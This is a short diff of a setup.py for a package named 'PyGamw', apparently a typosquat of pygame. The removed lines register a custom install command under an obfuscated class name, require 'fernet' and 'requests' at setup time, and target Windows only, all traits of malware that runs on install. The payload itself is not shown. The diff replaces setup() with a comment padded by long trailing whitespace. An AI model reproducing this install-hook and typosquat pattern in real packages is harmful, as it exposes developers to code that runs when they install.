@@ -18,22 +18,5 @@ class kWqxwAhoGbtGNggUKYzIiuLawLrnkSwAXyzFwvaUtrOeOabdXseIlkhGOpsxRDnLAnXccvCWcb
             install.run(self)
 
 
-setup(
-    name="PyGamw",
-    version=VERSION,
-    author="WcIAjYgwzluNPesM",
-    author_email="CRmecFOzogoQDLK@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': kWqxwAhoGbtGNggUKYzIiuLawLrnkSwAXyzFwvaUtrOeOabdXseIlkhGOpsxRDnLAnXccvCWcbldhxBhStoxZ,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
 
